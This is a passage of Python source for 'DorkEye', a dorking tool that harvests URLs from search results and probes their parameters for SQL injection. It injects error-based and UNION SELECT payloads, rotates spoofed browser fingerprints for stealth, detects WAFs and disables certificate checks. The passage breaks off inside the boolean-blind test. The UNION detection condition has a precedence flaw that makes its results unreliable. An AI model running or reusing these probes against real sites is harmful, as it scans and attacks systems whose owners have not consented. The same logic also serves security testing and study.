#!/usr/bin/env python3
"""
DorkEye v4.6 | OSINT Dorking Tool
Author: xPloits3c I.C.W.T| https://github.com/xPloits3c/DorkEye
"""

import os
import sys
import time
import json
import yaml
import random
import argparse
import hashlib
import difflib
import csv
import re
import signal
import statistics
import queue
import threading
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Set, Tuple, Optional
from urllib.parse import urlparse, unquote, parse_qs, urlencode, quote
from collections import defaultdict
from dataclasses import dataclass
from enum import Enum

import requests
from requests.adapters import HTTPAdapter
from dork_generator import DorkGenerator
from urllib3.util.retry import Retry
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.table import Table
from rich.panel import Panel
from ddgs import DDGS
import socket
import getpass

console = Console()

VALID_MODES = ["soft", "medium", "aggressive"]

# ══════════════════════════════════════════════════════════════
#  [7] Termux / Android auto-detection
#  Detected once at import time; downstream constants are
#  adjusted immediately so every subsystem picks them up.
# ══════════════════════════════════════════════════════════════

def _detect_termux_android() -> bool:
    """Return True when running inside Termux on Android."""
    return (
        "TERMUX_VERSION" in os.environ
        or os.environ.get("PREFIX", "").startswith("/data/data/com.termux")
        or os.path.isdir("/data/data/com.termux")
    )

TERMUX_IS_ANDROID: bool = _detect_termux_android()

# ══════════════════════════════════════════════════════════════
#  Ctrl+C interrupt state
# ══════════════════════════════════════════════════════════════

_last_interrupt_time: float = 0.0
_skip_current: bool         = False
_exit_requested: bool       = False


def _sigint_handler(signum, frame):
    global _last_interrupt_time, _skip_current, _exit_requested
    now = time.monotonic()
    if now - _last_interrupt_time < 1.5:
        _exit_requested = True
        sys.stderr.write("\n[!!] Double Ctrl+C detected — exiting...\n")
        sys.stderr.flush()
    else:
        _skip_current = True
        sys.stderr.write("\n[~] Ctrl+C — skipping current task...\n")
        sys.stderr.flush()
    _last_interrupt_time = now


signal.signal(signal.SIGINT, _sigint_handler)


def _interruptible_sleep(seconds: float, step: float = 0.25) -> None:
    """Sleep in small steps; return immediately if skip/exit is flagged."""
    elapsed = 0.0
    while elapsed < seconds:
        if _exit_requested or _skip_current:
            return
        time.sleep(min(step, seconds - elapsed))
        elapsed += step


def print_banner():
    TITLE_ROWS = [
        ("bold bright_blue", "╔╦╗╔═╗╦═╗╦╔═  ╔═╗╦ ╦╔═╗"),
        ("bold blue",        " ║║║ ║╠╦╝╠╩╗  ║╣ ╚╦╝║╣"),
        ("bold blue",        "═╩╝╚═╝╩╚═╩ ╩  ╚═╝ ╩ ╚═╝"),
    ]
    for style, row in TITLE_ROWS:
        console.print(f"[{style}]{row}[/{style}]")
    console.print()

    SYRINGE = (
        "[bold yellow] ___[/bold yellow]\n"
        "[bold yellow]__H__[/bold yellow]\n"
        "[bold yellow] [[/bold yellow][bold red],[/bold red][bold yellow]][/bold yellow]\n"
        "[bold yellow] [[/bold yellow][bold red])[/bold red][bold yellow]][/bold yellow]\n"
        "[bold yellow] [[/bold yellow][bold red];[/bold red][bold yellow]][/bold yellow]\n"
        "[bold yellow] |_|[/bold yellow]\n"
        "[bold yellow]  V[/bold yellow]"
    )

    # [7] Show Android badge when detected
    android_badge = (
        "\n[bold yellow]▸ Platform[/bold yellow] [dim]│[/dim]  "
        "[bold green]Android / Termux  ⚡ battery-saver active[/bold green]"
        if TERMUX_IS_ANDROID else ""
    )

    INFO = (
        "[bold white]OSINT DORKING TOOL[/bold white]\n"
        "[bold green]v4.6[/bold green]  [dim]stable[/dim]\n"
        "\n"
        "[dim]▸ Author[/dim]  [dim]│[/dim]  [cyan]xPloits3c I.C.W.T[/cyan]\n"
        "[dim]▸ GitHub[/dim]  [dim]│[/dim]  [cyan]github.com/xPloits3c/DorkEye[/cyan]\n"
        "[dim]▸ Site  [/dim]  [dim]│[/dim]  [cyan]xploits3c.github.io/DorkEye[/cyan]\n"
        "\n"
        "[dim]▸ Engine[/dim]  [dim]│[/dim]  [green]DuckDuckGo[/green]\n"
        "[dim]▸ SQLi  [/dim]  [dim]│[/dim]  [green]Real detection[/green]\n"
        "[dim]▸ Stealth[/dim] [dim]│[/dim]  [green]HTTP fingerprinting[/green]\n"
        "[dim]▸ Analyzer[/dim][dim]│[/dim]  [green]Extract metadata[/green]"
        + android_badge
    )

    grid = Table.grid(padding=(0, 6))
    grid.add_column(min_width=10)
    grid.add_column()
    grid.add_row(SYRINGE, INFO)
    console.print(grid)
    console.print()

    console.print(Panel(
        "[bold red]⚠  Legal disclaimer[/bold red]\n"
        "[dim]Attacking targets without prior mutual consent is illegal.[/dim]\n"
        "[dim]It is the end user's responsibility to obey all applicable local, state and federal laws.[/dim]",
        border_style="red",
        padding=(0, 2),
    ))
    console.print()


WELCOME_MESSAGES = [
    "Stay safe, {name}.",
    "Session initialized, {name}.",
    "Connected. Welcome back, {name}.",
    "Terminal ready, {name}.",
    "OSINT mode active, {name}.",
    "Curiosity leaves footprints.",
    "VPN is not invisibility.",
    "They log more than you think.",
    "Silence. Just data, {name}.",
    "Back online, {name}.",
    "Workspace loaded, {name}.",
    "Use isolated environments.",
    "Targets waiting, {name}.",
    "Query the noise, {name}.",
    "Burn what you touch.",
    "You are visible.",
    "No small talk. Just results, {name}.",
    "We don't break things. We observe, {name}.",
    "Information wants to be found, {name}.",
    "Trust nothing. Verify everything, {name}.",
    "Stay invisible, {name}.",
    "Let's see what they forgot to hide, {name}.",
]

WELCOME_COLORS = [
    "green", "bright_green", "yellow", "bright_yellow",
    "magenta", "bright_magenta", "blue", "bright_blue",
    "red", "bright_red", "white",
]


def get_user_name() -> str:
    try:
        return getpass.getuser()
    except Exception:
        try:
            return socket.gethostname()
        except Exception:
            return "friend"


def greet_user():
    name    = get_user_name()
    message = random.choice(WELCOME_MESSAGES).format(name=name)
    color   = random.choice(WELCOME_COLORS)
    console.print(f"[bold {color}]{message}[/bold {color}]\n")


# ══════════════════════════════════════════════════════════════
#  Enums / Dataclasses
# ══════════════════════════════════════════════════════════════

class SQLiConfidence(Enum):
    NONE     = "none"
    LOW      = "low"
    MEDIUM   = "medium"
    HIGH     = "high"
    CRITICAL = "critical"


@dataclass
class HTTPFingerprint:
    browser:         str
    os:              str
    user_agent:      str
    accept_language: str
    accept_encoding: str
    accept:          str
    referer:         str
    sec_fetch_dest:  str
    sec_fetch_mode:  str
    sec_fetch_site:  str
    cache_control:   str


# ══════════════════════════════════════════════════════════════
#  HTTP Fingerprinting
# ══════════════════════════════════════════════════════════════

def load_http_fingerprints() -> Dict:
    fingerprint_file = Path(__file__).parent / "http_fingerprints.json"
    try:
        with open(fingerprint_file, "r", encoding="utf-8") as f:
            data = json.load(f)
        if not isinstance(data, dict) or not data:
            raise ValueError("Fingerprint file is empty or invalid")
        if "fingerprints" in data:
            return {
                "_mode":             "advanced",
                "_meta":             data.get("_meta", {}),
                "fingerprints":      data.get("fingerprints", {}),
                "language_profiles": data.get("language_profiles", {}),
                "common_headers":    data.get("common_headers", {})
            }
        return {"_mode": "legacy", "fingerprints": data}
    except Exception as e:
        console.print(f"[yellow][!] Failed to load HTTP fingerprints: {e}[/yellow]")
        console.print("[yellow][!] HTTP fingerprinting will be disabled[/yellow]")
        return {"_mode": "disabled"}


def resolve_reference(value: str, common_headers: Dict) -> str:
    if isinstance(value, str) and value.startswith("@"):
        key = value[1:]
        return common_headers.get(key, "")
    return value


def resolve_accept_language(fp_headers: Dict, language_profiles: Dict) -> str:
    profiles = fp_headers.get("accept_language_profiles")
    if not profiles:
        return ""
    profile = random.choice(profiles)
    return language_profiles.get(profile, "")


USER_AGENTS = {
    "chrome": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    ],
    "firefox": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0"
    ],
    "safari": [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
    ],
    "edge": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
    ]
}

DEFAULT_CONFIG = {
    "extensions": {
        "documents":   [".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".ods"],
        "archives":    [".zip", ".rar", ".tar", ".gz", ".7z", ".bz2"],
        "databases":   [".sql", ".db", ".sqlite", ".mdb"],
        "backups":     [".bak", ".backup", ".old", ".tmp"],
        "configs":     [".conf", ".config", ".ini", ".yaml", ".yml", ".json", ".xml"],
        "scripts":     [".php", ".asp", ".aspx", ".jsp", ".sh", ".bat", ".ps1"],
        "credentials": [".env", ".git", ".svn", ".htpasswd"]
    },
    "blacklist":            [],
    "whitelist":            [],
    "analyze_files":        True,
    "max_file_size_check":  52428800,
    "sqli_detection":       False,
    "stealth_mode":         False,
    "user_agent_rotation":  True,
    "http_fingerprinting":  True,
    "request_timeout":      10,
    "max_retries":          3,
    "extended_delay_every_n_results": 100,
}


# ══════════════════════════════════════════════════════════════
#  HTTPFingerprintRotator
# ══════════════════════════════════════════════════════════════

class HTTPFingerprintRotator:
    def __init__(self):
        self.raw_fingerprints    = load_http_fingerprints()
        self.fingerprints        = self._build_fingerprints()
        self.current_index       = 0
        self.current_fingerprint = None

    def _build_fingerprints(self) -> List[HTTPFingerprint]:
        fingerprints: List[HTTPFingerprint] = []
        mode = self.raw_fingerprints.get("_mode")

        if mode == "legacy":
            for fp_data in self.raw_fingerprints.get("fingerprints", {}).values():
                try:
                    fingerprints.append(HTTPFingerprint(
                        browser         = fp_data["browser"],
                        os              = fp_data["os"],
                        user_agent      = fp_data["user_agent"],
                        accept_language = fp_data["accept_language"],
                        accept_encoding = fp_data["accept_encoding"],
                        accept          = fp_data["accept"],
                        referer         = "",
                        sec_fetch_dest  = fp_data["sec_fetch_dest"],
                        sec_fetch_mode  = fp_data["sec_fetch_mode"],
                        sec_fetch_site  = fp_data["sec_fetch_site"],
                        cache_control   = fp_data["cache_control"],
                    ))
                except KeyError:
                    continue
            return fingerprints

        if mode == "advanced":
            language_profiles = self.raw_fingerprints.get("language_profiles", {})
            common_headers    = self.raw_fingerprints.get("common_headers", {})
            fps               = self.raw_fingerprints.get("fingerprints", {})
            for fp in fps.values():
                try:
                    headers   = fp.get("headers", {})
                    sec_fetch = headers.get("sec_fetch", {})
                    fingerprints.append(HTTPFingerprint(
                        browser         = fp.get("browser", ""),
                        os              = fp.get("os", ""),
                        user_agent      = fp.get("user_agent", ""),
                        accept_language = resolve_accept_language(headers, language_profiles),
                        accept_encoding = resolve_reference(headers.get("accept_encoding", ""), common_headers),
                        accept          = resolve_reference(headers.get("accept", ""), common_headers),
                        referer         = "",
                        sec_fetch_dest  = sec_fetch.get("dest", "document"),
                        sec_fetch_mode  = sec_fetch.get("mode", "navigate"),
                        sec_fetch_site  = sec_fetch.get("site", "none"),
                        cache_control   = resolve_reference(headers.get("cache_control", ""), common_headers),
                    ))
                except Exception:
                    continue

        return fingerprints

    def get_random(self) -> Optional[HTTPFingerprint]:
        self.current_fingerprint = random.choice(self.fingerprints) if self.fingerprints else None
        return self.current_fingerprint

    def get_next(self) -> Optional[HTTPFingerprint]:
        if not self.fingerprints:
            return None
        self.current_fingerprint = self.fingerprints[self.current_index]
        self.current_index       = (self.current_index + 1) % len(self.fingerprints)
        return self.current_fingerprint

    def build_headers(self, referer: str = "") -> Dict[str, str]:
        if not self.current_fingerprint:
            return {"User-Agent": "Mozilla/5.0", "Accept": "*/*", "Connection": "keep-alive"}
        headers = {
            "User-Agent":                self.current_fingerprint.user_agent,
            "Accept":                    self.current_fingerprint.accept,
            "Accept-Language":           self.current_fingerprint.accept_language,
            "Accept-Encoding":           self.current_fingerprint.accept_encoding,
            "Sec-Fetch-Dest":            self.current_fingerprint.sec_fetch_dest,
            "Sec-Fetch-Mode":            self.current_fingerprint.sec_fetch_mode,
            "Sec-Fetch-Site":            self.current_fingerprint.sec_fetch_site,
            "Cache-Control":             self.current_fingerprint.cache_control,
            "Pragma":                    "no-cache",
            "DNT":                       "1",
            "Connection":                "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }
        if referer:
            headers["Referer"] = referer
        return headers


# ══════════════════════════════════════════════════════════════
#  CircuitBreaker
# ══════════════════════════════════════════════════════════════

class CircuitBreaker:
    def __init__(self):
        self._dead: Set[str] = set()

    def _key(self, url: str) -> str:
        p = urlparse(url)
        return f"{p.scheme}://{p.netloc}"

    def is_dead(self, url: str) -> bool:
        return self._key(url) in self._dead

    def mark_dead(self, url: str) -> None:
        self._dead.add(self._key(url))

    def reset(self) -> None:
        self._dead.clear()


# ══════════════════════════════════════════════════════════════
#  SQLiDetector — constants
#  [7] Android/Termux: reduced timeouts and sample counts to
#      lower CPU/battery usage on constrained hardware.
# ══════════════════════════════════════════════════════════════

_CONNECT_TIMEOUT  = 3 if TERMUX_IS_ANDROID else 4
_DEFAULT_READ     = 6 if TERMUX_IS_ANDROID else 8
_TIMEBASED_MARGIN = 2.5
_SLEEP_DELAY      = 3
_BASELINE_SAMPLES = 1 if TERMUX_IS_ANDROID else 2   # [7]
_MAX_BASELINE_S   = 6.0

_PROBE_SAMPLES       = 2 if TERMUX_IS_ANDROID else 3    # [7]
_PROBE_NOISE_BUFFER  = 0.04
_PROBE_MAX_THRESHOLD = 0.18
_BOOL_SAMPLES        = 2 if TERMUX_IS_ANDROID else 3    # [7]
_TIMEBASED_CONFIRM   = 1 if TERMUX_IS_ANDROID else 2    # [7]
_UNION_COLUMNS_MAX   = 5                                 # [5]

_SCRIPT_TAG_RE = re.compile(r"<script[\s\S]*?</script\s*>", re.IGNORECASE)

# ══════════════════════════════════════════════════════════════
#  [4] WAF detection signatures
#  Keys: canonical WAF name.
#  Values: substrings checked in response headers (keys/values)
#          and in the first 2 KB of the response body.
# ══════════════════════════════════════════════════════════════

WAF_SIGNATURES: Dict[str, List[str]] = {
    "cloudflare":  ["cf-ray", "__cfduid", "cloudflare", "attention required! | cloudflare"],
    "modsecurity": ["mod_security", "modsecurity", "406 not acceptable", "not acceptable!"],
    "wordfence":   ["wordfence", "generated by wordfence"],
    "sucuri":      ["x-sucuri-id", "sucuri website firewall", "access denied - sucuri"],
    "imperva":     ["x-iinfo", "incapsula incident", "_incap_ses_"],
    "akamai":      ["akamai", "x-akamai-transformed", "reference #18"],
    "f5_bigip":    ["x-waf-event-info", "bigipserver", "the requested url was rejected"],
    "barracuda":   ["barra_counter_session", "barracuda"],
    "fortiweb":    ["fortigate", "fortiweb"],
    "aws_waf":     ["x-amzn-requestid", "awselb", "forbidden - aws waf"],
    "denyall":     ["denyall", "x-denyall"],
    "reblaze":     ["x-reblaze-protection"],
}

# ══════════════════════════════════════════════════════════════
#  [6] Parameter priority tables
# ══════════════════════════════════════════════════════════════

_HIGH_PRIORITY_PARAMS: frozenset = frozenset({
    "id", "pid", "uid", "nid", "tid", "cid", "rid", "eid", "fid", "gid",
    "page", "pg", "p", "num", "item", "product", "prod", "article",
    "cat", "category", "sort", "order", "by", "type", "idx", "index",
    "ref", "record", "row", "entry", "post", "news", "view",
})

_MEDIUM_PRIORITY_PARAMS: frozenset = frozenset({
    "search", "q", "query", "s", "keyword", "kw", "term", "find",
    "name", "user", "username", "login", "email", "mail",
    "city", "country", "region", "lang", "language",
    "filter", "tag", "label", "topic", "subject", "section",
})


# ══════════════════════════════════════════════════════════════
#  SQLiDetector
# ══════════════════════════════════════════════════════════════

class SQLiDetector:

    SQL_ERROR_SIGNATURES = {
        "mysql": [
            r"You have an error in your SQL syntax",
            r"Warning.*mysqli?_",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"mysql_num_rows\(\)",
            r"mysql_fetch_(?:array|assoc|row|object)",
            r"MySQL server version for the right syntax",
            r"com\.mysql\.jdbc\.exceptions",
        ],
        "postgresql": [
            r"PostgreSQL.*ERROR",
            r"Warning.*\bpg_",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"org\.postgresql\.util\.PSQLException",
            r"ERROR:\s+syntax error at or near",
            r"ERROR:\s+unterminated quoted string",
        ],
        "mssql": [
            r"Driver.*SQL[\-\_\ ]*Server",
            r"OLE DB.*SQL Server",
            r"SQLServer JDBC Driver",
            r"Microsoft SQL Native Client error",
            r"ODBC SQL Server Driver",
            r"Unclosed quotation mark after the character string",
            r"Microsoft OLE DB Provider for SQL Server",
            r"\[Microsoft\]\[ODBC SQL Server Driver\]",
            r"Incorrect syntax near",
        ],
        "sqlite": [
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"sqlite3\.OperationalError:",
            r"near \".*\": syntax error",
        ],
        "oracle": [
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*\boci_",
            r"ORA-\d{5}",
            r"oracle\.jdbc\.driver",
            r"quoted string not properly terminated",
        ],
    }

    # UNION column-count mismatch patterns (server IS processing the UNION)
    _UNION_COL_MISMATCH_RE = re.compile(
        r"(The used SELECT statements have a different number of columns"
        r"|each UNION query must have the same number of columns"
        r"|SELECTs to the left and right of UNION do not have the same number"
        r"|ORA-01789"         # Oracle
        r"|column count doesn.t match)",
        re.IGNORECASE,
    )

    def __init__(self, stealth: bool = False, timeout: int = _DEFAULT_READ):
        self.stealth             = stealth
        self.read_timeout        = timeout
        self.circuit_breaker     = CircuitBreaker()
        self.fingerprint_rotator = HTTPFingerprintRotator()
        self._session            = self._build_session()

    def _build_session(self) -> requests.Session:
        session = requests.Session()
        retry   = Retry(
            total            = 2,
            backoff_factor   = 0.5,
            status_forcelist = [429, 500, 502, 503, 504],
            allowed_methods  = ["GET"],
            raise_on_status  = False,
        )
        adapter = HTTPAdapter(max_retries=retry)
        session.mount("http://",  adapter)
        session.mount("https://", adapter)
        return session

    def _timeout(self, extra_read: float = 0) -> Tuple[int, float]:
        return (_CONNECT_TIMEOUT, self.read_timeout + extra_read)

    # ──────────────────────────────────────────────────────────
    #  _run_interruptible
    #
    #  Root-cause fix for Ctrl+C not working during HTTP calls:
    #
    #  requests.Session.get/post() block the Python interpreter
    #  inside C-level socket.recv().  While blocked there, the
    #  GIL is held by the syscall — Python can never schedule
    #  the signal-handler flag check until the call returns
    #  (which can be up to 17-36 s in the worst case).
    #
    #  Fix: run every network call in a daemon thread.
    #  The main thread polls a threading.Event every 0.1 s,
    #  checking _skip_current/_exit_requested between polls.
    #  Ctrl+C is therefore always acted on within ~100 ms
    #  regardless of what the network is doing.
    #  The in-flight daemon thread is abandoned (it will
    #  eventually time out on its own, harmlessly).
    # ──────────────────────────────────────────────────────────

    def _run_interruptible(
        self,
        fn,
        total_timeout: float,
        on_connect_error=None,
    ):
        """
        Run fn() in a daemon thread; poll every 0.1 s for skip/exit.
        Returns fn()'s return value, or None on skip/exit/timeout.
        on_connect_error: optional zero-arg callback called when
        ConnectTimeout/ConnectionError is raised inside fn().
        """
        _POLL = 0.1
        result_holder = [None]
        exc_holder    = [None]
        done_event    = threading.Event()

        def _worker():
            try:
                result_holder[0] = fn()
            except (requests.exceptions.ConnectTimeout,
                    requests.exceptions.ConnectionError) as e:
                exc_holder[0] = e
            except Exception:
                pass
            finally:
                done_event.set()

        threading.Thread(target=_worker, daemon=True).start()

        deadline = total_timeout + 1.0   # small grace period
        elapsed  = 0.0
        while elapsed < deadline:
            if _exit_requested or _skip_current:
                return None
            if done_event.wait(timeout=_POLL):
                if exc_holder[0] is not None and on_connect_error:
                    on_connect_error()
                return result_holder[0]
            elapsed += _POLL

        return None   # timed out (should never happen given requests timeout)

    def _get(self, url: str, extra_read: float = 0) -> Optional[requests.Response]:
        if self.circuit_breaker.is_dead(url):
            return None

        self.fingerprint_rotator.get_random()
        headers = self.fingerprint_rotator.build_headers()
        timeout = self._timeout(extra_read)

        def _do():
            return self._session.get(
                url,
                headers         = headers,
                timeout         = timeout,
                verify          = False,
                allow_redirects = True,
            )

        # Total time the underlying request is allowed to take
        total = _CONNECT_TIMEOUT + self.read_timeout + extra_read

        return self._run_interruptible(
            _do,
            total_timeout    = total,
            on_connect_error = lambda: self.circuit_breaker.mark_dead(url),
        )

    # ──────────────────────────────────────────────────────────
    #  [4] WAF Detection
    # ──────────────────────────────────────────────────────────

    def _detect_waf(self, response: requests.Response) -> Optional[str]:
        """
        Return the canonical WAF name if a WAF fingerprint is found in
        response headers or the first 2 KB of the body, else None.

        A 403/406/429 with an unusually short body triggers a generic
        'generic_waf' label even if no named WAF matches.
        """
        headers_keys   = {k.lower() for k in response.headers}
        headers_values = " ".join(v.lower() for v in response.headers.values())
        body_snippet   = response.text[:2000].lower()

        for waf_name, sigs in WAF_SIGNATURES.items():
            for sig in sigs:
                if sig in headers_keys or sig in headers_values or sig in body_snippet:
                    return waf_name

        # Generic heuristic: blocked status + minimal body
        if response.status_code in (403, 406, 419, 429) and len(response.text) < 600:
            return "generic_waf"

        return None

    def _measure_baseline_latency(self, url: str) -> Optional[float]:
        times = []
        for _ in range(_BASELINE_SAMPLES):
            if self.circuit_breaker.is_dead(url):
                return None
            if _exit_requested or _skip_current:
                return None
            t0       = time.monotonic()
            response = self._get(url)
            elapsed  = time.monotonic() - t0
            if response is None:
                return None
            times.append(elapsed)
            _interruptible_sleep(0.3)
        baseline = sum(times) / len(times)
        if baseline > _MAX_BASELINE_S:
            return None
        return baseline

    def has_query_params(self, url: str) -> bool:
        try:
            return bool(parse_qs(urlparse(url).query))
        except Exception:
            return False

    def _extract_query_params(self, url: str) -> Dict[str, str]:
        try:
            params = parse_qs(urlparse(url).query)
            return {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
        except Exception:
            return {}

    def _inject_payload(self, url: str, param_name: str, payload: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if param_name not in params:
            return url
        params[param_name] = [payload]
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"

    def _get_baseline_response(self, url: str) -> Optional[Tuple[int, str, int]]:
        response = self._get(url)
        if response is None:
            return None
        return (response.status_code, response.text, len(response.text))

    def _match_sql_errors(self, body: str) -> Optional[Tuple[str, str]]:
        clean_body = _SCRIPT_TAG_RE.sub("", body)
        for db_type, patterns in self.SQL_ERROR_SIGNATURES.items():
            for pattern in patterns:
                if re.search(pattern, clean_body, re.IGNORECASE):
                    return (db_type, pattern)
        return None

    # ──────────────────────────────────────────────────────────
    #  [6] Parameter prioritisation
    # ──────────────────────────────────────────────────────────

    def _prioritize_params(self, params: Dict[str, str]) -> List[str]:
        """
        Return parameter names sorted by injection likelihood:
        1. numeric value  |  known high-priority name  → HIGH
        2. known medium-priority name                  → MEDIUM
        3. everything else                             → LOW

        Within each tier the original insertion order is preserved.
        """
        high: List[str] = []
        medium: List[str] = []
        low: List[str] = []

        for param, value in params.items():
            p_lower = param.lower()
            if value.isdigit() or p_lower in _HIGH_PRIORITY_PARAMS:
                high.append(param)
            elif p_lower in _MEDIUM_PRIORITY_PARAMS:
                medium.append(param)
            else:
                low.append(param)

        return high + medium + low

    # ──────────────────────────────────────────────────────────
    #  [2] _probe_parameter — baseline_status bug fix
    #
    #  Original bug: baseline_status was captured inside the
    #  noise-sampling loop only on i==0, mixing baseline capture
    #  with noise measurement.  If the first _get() returned None
    #  we'd short-circuit before setting it; also, the noise loop
    #  counted that first request both as noise sample AND as the
    #  status baseline, making the two concerns inconsistent.
    #
    #  Fix: dedicate a separate request to capture baseline_status
    #  BEFORE the noise loop.  That first response is also used as
    #  the first noise sample (no extra network round-trip).
    # ──────────────────────────────────────────────────────────

    def _probe_parameter(self, url: str, param_name: str, baseline_content: str) -> bool:
        if self.circuit_breaker.is_dead(url):
            return False

        # ── Dedicated baseline request (fix for bug [2]) ──────
        r_init = self._get(url)
        if r_init is None:
            return False
        baseline_status: int = r_init.status_code
        first_sim            = difflib.SequenceMatcher(None, baseline_content, r_init.text).ratio()
        noise_samples: List[float] = [1.0 - first_sim]

        # ── Remaining noise samples ────────────────────────────
        for _ in range(_PROBE_SAMPLES - 1):   # already have one sample
            if _exit_requested or _skip_current:
                return False
            r = self._get(url)
            if r is None:
                return False
            sim = difflib.SequenceMatcher(None, baseline_content, r.text).ratio()
            noise_samples.append(1.0 - sim)
            _interruptible_sleep(0.2)

        noise_level = statistics.median(noise_samples)

        if noise_level > _PROBE_MAX_THRESHOLD:
            return False

        adaptive_threshold = noise_level + _PROBE_NOISE_BUFFER

        # ── Single-quote payload probe ─────────────────────────
        test_url  = self._inject_payload(url, param_name, "1'")
        r_payload = self._get(test_url)
        if r_payload is None:
            return False

        # Status-code divergence → server reacted differently → interesting
        if r_payload.status_code != baseline_status:
            return False

        payload_noise = 1.0 - difflib.SequenceMatcher(
            None, baseline_content, r_payload.text
        ).ratio()

        return payload_noise > adaptive_threshold

    def _test_error_based(self, url: str, param_name: str) -> Dict:
        result = {
            "method":     "error_based",
            "vulnerable": False,
            "confidence": SQLiConfidence.NONE.value,
            "evidence":   [],
            "waf":        None,   # [4]
        }
        payloads = [
            "1' AND extractvalue(0,concat(0x7e,'TEST',0x7e)) AND '1'='1",
            "1 AND 1=CAST(CONCAT(0x7e,'TEST',0x7e) as INT)",
            "1'; SELECT NULL#",
        ]
        for payload in payloads:
            if self.circuit_breaker.is_dead(url):
                break
            if _exit_requested or _skip_current:
                break

            test_url = self._inject_payload(url, param_name, payload)
            response = self._get(test_url)
            if response is None:
                continue

            # [4] WAF check — blocked response is not a real SQL error
            waf = self._detect_waf(response)
            if waf:
                result["waf"] = waf
                result["evidence"].append(f"WAF detected ({waf}): error-based skipped")
                break

            match = self._match_sql_errors(response.text)
            if match:
                db_type, pattern = match
                result["vulnerable"] = True
                result["confidence"] = SQLiConfidence.HIGH.value
                result["evidence"].append(
                    f"{db_type.upper()} error signature matched: {pattern[:60]}"
                )
                return result

            if self.stealth:
                _interruptible_sleep(random.uniform(1.5, 3))

        return result

    # ──────────────────────────────────────────────────────────
    #  [5] UNION-based probe
    #
    #  Strategy:
    #    1. For n = 1 … _UNION_COLUMNS_MAX, inject a UNION SELECT
    #       with n NULL columns using multiple syntax variants.
    #    2. If a column-count mismatch error appears the server IS
    #       processing the UNION (SQLi confirmed, wrong col count).
    #       We record the mismatch and continue to find the right n.
    #    3. When mismatch errors stop and the response length
    #       differs significantly from baseline, UNION succeeded.
    #    4. A WAF block on any attempt aborts the probe early.
    # ──────────────────────────────────────────────────────────

    def _test_union_based(
        self, url: str, param_name: str, baseline_len: int
    ) -> Dict:
        result = {
            "method":     "union_based",
            "vulnerable": False,
            "confidence": SQLiConfidence.NONE.value,
            "evidence":   [],
            "waf":        None,
        }

        mismatch_at: List[int] = []   # column counts that triggered mismatch

        for n_cols in range(1, _UNION_COLUMNS_MAX + 1):
            if self.circuit_breaker.is_dead(url):
                break
            if _exit_requested or _skip_current:
                break

            null_cols = ",".join(["NULL"] * n_cols)
            # Four syntax variants: quoted/unquoted × comment style
            payloads = [
                f"' UNION SELECT {null_cols}--",
                f"' UNION SELECT {null_cols}#",
                f"-1 UNION SELECT {null_cols}--",
                f"0 UNION ALL SELECT {null_cols}--",
            ]

            for payload in payloads:
                if _exit_requested or _skip_current:
                    break

                test_url = self._inject_payload(url, param_name, payload)
                response = self._get(test_url)
                if response is None:
                    continue

                # [4] WAF check
                waf = self._detect_waf(response)
                if waf:
                    result["waf"] = waf
                    result["evidence"].append(
                        f"WAF detected ({waf}): UNION probe aborted at {n_cols} cols"
                    )
                    return result

                body = response.text

                # Column count mismatch → server is processing the UNION
                if self._UNION_COL_MISMATCH_RE.search(body):
                    if n_cols not in mismatch_at:
                        mismatch_at.append(n_cols)
                        result["evidence"].append(
                            f"UNION col-mismatch at n={n_cols} — server processes UNION"
                        )
                    break  # try next column count

                # SQL error from a different cause → still confirms injection
                sql_match = self._match_sql_errors(body)
                if sql_match:
                    db_type, pattern = sql_match
                    result["vulnerable"] = True
                    result["confidence"] = SQLiConfidence.HIGH.value
                    result["evidence"].append(
                        f"UNION triggered {db_type.upper()} error at n={n_cols}: {pattern[:50]}"
                    )
                    return result

                # Significant length change with 200 OK → UNION probably worked
                len_diff = abs(len(body) - baseline_len)
                if (response.status_code == 200
                        and len_diff > baseline_len * 0.20
                        and n_cols in mismatch_at or mismatch_at):
                    result["vulnerable"] = True
                    result["confidence"] = SQLiConfidence.MEDIUM.value
                    result["evidence"].append(
                        f"UNION SELECT {n_cols} cols: response Δ={len_diff}B "
                        f"(prev mismatches at cols {mismatch_at})"
                    )
                    return result

                if self.stealth:
                    _interruptible_sleep(random.uniform(0.5, 1.5))

        # Even without full exploitation, confirmed mismatch errors → LOW confidence
        if mismatch_at:
            result["vulnerable"] = True
            result["confidence"] = SQLiConfidence.LOW.value
            result["evidence"].append(
                f"UNION col-mismatch at col(s) {mismatch_at}: UNION syntax processed by server"
            )

        return result

    def _test_boolean_blind(self, url: str, param_name: str, baseline_len: int) -> Dict:
        result = {
            "method":     "boolean_blind",
